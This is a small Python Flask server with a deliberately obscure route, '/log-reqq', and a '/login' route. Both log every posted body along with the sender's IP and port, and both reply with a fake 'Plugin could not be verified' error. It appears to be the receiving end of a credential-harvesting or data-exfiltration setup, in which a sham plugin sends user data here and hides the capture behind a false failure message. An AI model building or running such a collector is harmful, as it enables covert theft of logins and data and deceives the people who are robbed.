from flask import Flask, json, request, jsonify
from flask_cors import CORS
import logging
import os
import datetime
import json

api = Flask(__name__)
CORS(api)
logging.getLogger('werkzeug').disabled = True

# Configure logging
log_file_path = os.path.join(os.path.dirname(__file__), 'request_logs.log')
logging.basicConfig(level=logging.INFO, format='%(message)s', handlers=[logging.FileHandler(log_file_path), logging.StreamHandler()])


# unique name route is created so that brute forcing doesnot find it
@api.route('/log-reqq', methods=["POST"])
def log():
  try:
    req_data = json.loads(request.data)
    log_data = {
        "datetime": datetime.datetime.now().isoformat(),
        "request_data": req_data,
        "source_ip": request.remote_addr,
        "source_port": request.environ.get('REMOTE_PORT')
    }
    logging.info(json.dumps(log_data))
    return jsonify({"msg":"Plugin could not be verified make sure you have the correct version"})
    
  except Exception as e:
    return json.dumps({"msg":"Plugin could not be verified make sure you have the correct version"})

@api.route('/login', methods=["POST"])
def login():
  try:
    req_data = json.loads(request.data)
    log_data = {
        "datetime": datetime.datetime.now().isoformat(),
        "request_data": req_data,
        "source_ip": request.remote_addr,
        "source_port": request.environ.get('REMOTE_PORT')
    }
    logging.info(json.dumps(log_data))
    return jsonify({"msg":"Plugin could not be verified make sure you have the correct version"})
    
  except Exception as e:
    return json.dumps({"msg":"Plugin could not be verified make sure you have the correct version"})

if __name__ == '__main__':
    api.run(host='0.0.0.0', port=5000)